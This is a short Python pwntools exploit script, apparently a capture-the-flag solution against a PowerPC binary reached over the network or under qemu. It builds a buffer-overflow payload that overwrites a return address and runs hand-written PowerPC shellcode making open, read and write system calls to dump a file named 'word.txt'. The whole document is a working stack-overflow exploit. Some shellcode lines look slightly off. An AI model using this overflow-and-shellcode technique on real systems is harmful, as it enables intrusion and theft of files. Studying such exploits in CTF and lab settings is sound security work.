from pwn import *
import sys

context.arch = "powerpc"
context.log_level = "DEBUG"

shellcode = '''
/*open word.txt*/
li r3 , 0x1ad8
li r4 , 0
li r5 , 0
li r0 , 5
sc

/*read 0*/
li r3 , 0
li r4 , 0x1ad8
li r5 , 100
li r0 , 3
sc


li r3 , 1
li r4 , 0x1ad8
stwu r5 , 50
li r0 , 4
sc

li r0 , 1
sc
'''


# qemu-ppc-static ./powerpc-elf.x  -g 1234

if len(sys.argv) > 1 :
	p = process(["qemu-ppc-static","-g","1234","./powerpc-elf.x"])
	context.log_level = "DEBUG"
else :
	#p = process("./powerpc-elf.x")
	p = remote("10.2.3.1","10002")

print len(asm(shellcode))

pay = "word.txt\x00".ljust(0x1c,"A")
pay += p32(0x1af8)
pay += asm(shellcode)

p.sendlineafter(":",pay)
p.interactive()
